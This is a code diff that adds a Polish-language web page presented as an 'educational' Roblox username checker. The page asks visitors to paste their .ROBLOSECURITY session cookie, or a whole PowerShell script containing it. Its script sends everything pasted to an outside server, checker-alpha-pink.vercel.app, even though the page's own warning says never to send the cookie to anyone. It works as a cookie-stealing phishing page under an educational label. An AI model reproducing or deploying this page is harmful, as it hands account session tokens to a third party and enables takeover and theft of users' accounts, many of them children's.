@@ -1,48 +1,168 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox – nazwa z .ROBLOSECURITY (edukacja)</title>
+  <style>
+    body {
+      font-family: Arial, Helvetica, sans-serif;
+      max-width: 700px;
+      margin: 40px auto;
+      padding: 20px;
+      background: #0f0f1a;
+      color: #e0e0ff;
+      line-height: 1.5;
+    }
+    h2 {
+      color: #a0d0ff;
+      text-align: center;
+    }
+    .warning {
+      background: #4a1a1a;
+      color: #ffcccc;
+      padding: 16px;
+      border-radius: 8px;
+      margin: 20px 0;
+      border-left: 5px solid #ff4444;
+    }
+    textarea {
+      width: 100%;
+      height: 160px;
+      background: #1a1a2e;
+      color: #d0d0ff;
+      border: 1px solid #444466;
+      border-radius: 6px;
+      padding: 12px;
+      font-family: 'Courier New', monospace;
+      font-size: 15px;
+      resize: vertical;
+      margin-bottom: 16px;
+    }
+    button {
+      background: #3366ff;
+      color: white;
+      border: none;
+      padding: 14px 32px;
+      font-size: 17px;
+      border-radius: 6px;
+      cursor: pointer;
+      display: block;
+      margin: 0 auto 24px;
+      transition: background 0.2s;
+    }
+    button:hover {
+      background: #1a4de6;
+    }
+    #result {
+      background: #1a1a2e;
+      border: 1px solid #444466;
+      border-radius: 8px;
+      padding: 20px;
+      min-height: 120px;
+      white-space: pre-wrap;
+      word-wrap: break-word;
+    }
+    .error  { color: #ff6666; font-weight: bold; }
+    .success { color: #66ff99; font-weight: bold; }
+    img.avatar {
+      border-radius: 12px;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.6);
+      max-width: 100%;
+      height: auto;
+    }
+    .avatar-container {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 24px;
+      justify-content: center;
+      margin-top: 20px;
+    }
+    .avatar-box {
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+<h2>Roblox – nazwa użytkownika z cookie (tylko do celów edukacyjnych)</h2>
+
+<div class="warning">
+  <strong>WAŻNE – przeczytaj zanim cokolwiek wkleisz!</strong><br><br>
+  • Nigdy nie używaj prawdziwego konta głównego<br>
+  • .ROBLOSECURITY = klucz do całego konta (można ukraść Robux, przedmioty, itd.)<br>
+  • To narzędzie jest tylko demonstracją techniki – nie wysyłaj nikomu swojego cookie<br>
+  • Najlepiej testuj na alt-koncie / fałszywym koncie
+</div>
+
+<textarea id="cookie" placeholder="Wklej tutaj .ROBLOSECURITY lub cały kod PowerShell / skrypt..."></textarea>
+
+<button onclick="sprawdz()">Sprawdź profil</button>
+
+<div id="result"></div>
+
+<script>
 async function sprawdz() {
   const inputVal = document.getElementById('cookie').value.trim();
   const result = document.getElementById('result');
+
   result.innerHTML = '';
 
   if (inputVal.length < 100) {
-    result.innerHTML = '<span class="error">Wklej cookie lub cały kod!</span>';
+    result.innerHTML = '<span class="error">Wklej cookie lub cały kod (minimum ~100 znaków)</span>';
     return;
   }
 
-  result.innerHTML = '<i>Sprawdzam... (to może potrwać 3–8 sekund)</i>';
+  result.innerHTML = '<i>Sprawdzam... (to może potrwać 3–10 sekund)</i>';
 
   try {
     const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie: inputVal })   // wysyłamy cały tekst
+      body: JSON.stringify({ cookie: inputVal })   // wysyłamy cały wklejony tekst
     });
+
+    if (!resp.ok) {
+      throw new Error(`Błąd serwera: ${resp.status} ${resp.statusText}`);
+    }
 
     const json = await resp.json();
 
     if (json.error) {
       result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
-    } else if (json.success) {
-      result.innerHTML = `
-        <span class="success">Znaleziono profil!</span><br><br>
-        <b>Nazwa użytkownika:</b> ${json.username}<br>
-        <b>Display Name:</b> ${json.displayName}<br>
-        <b>User ID:</b> ${json.userId}<br><br>
-
-        <div style="display:flex; gap:20px; flex-wrap:wrap;">
-          <div>
-            <b>Headshot (głowa):</b><br>
-            <img src="${json.headshot}" alt="Headshot" style="max-width:220px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.5);">
-          </div>
-          <div>
-            <b>Full body:</b><br>
-            <img src="${json.fullbody}" alt="Full body" style="max-width:320px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.5);">
-          </div>
-        </div>
-      `;
-    } else {
-      result.innerHTML = '<span class="error">Nieznana odpowiedź</span>';
+      return;
     }
-  } catch (e) {
-    result.innerHTML = `<span class="error">Błąd: ${e.message} (sprawdź konsolę F12)</span>`;
+
+    if (!json.success) {
+      result.innerHTML = '<span class="error">Nieprawidłowa odpowiedź serwera</span>';
+      return;
+    }
+
+    // Sukces
+    result.innerHTML = `
+      <span class="success">Znaleziono profil!</span><br><br>
+
+      <b>Nazwa użytkownika:</b> ${json.username}<br>
+      <b>Display Name:</b> ${json.displayName}<br>
+      <b>User ID:</b> ${json.userId}<br><br>
+
+      <div class="avatar-container">
+        <div class="avatar-box">
+          <div>Headshot (420×420)</div>
+          <img src="${json.headshot}" class="avatar" alt="Headshot">
+        </div>
+        <div class="avatar-box">
+          <div>Pełny awatar (720×900)</div>
+          <img src="${json.fullbody}" class="avatar" alt="Full body avatar">
+        </div>
+      </div>
+    `;
+  } catch (err) {
+    result.innerHTML = `<span class="error">Błąd połączenia: ${err.message}</span><br>
+                        <small>(otwórz F12 → Console i zobacz szczegóły błędu)</small>`;
   }
 }
+</script>
+
+</body>
+</html>
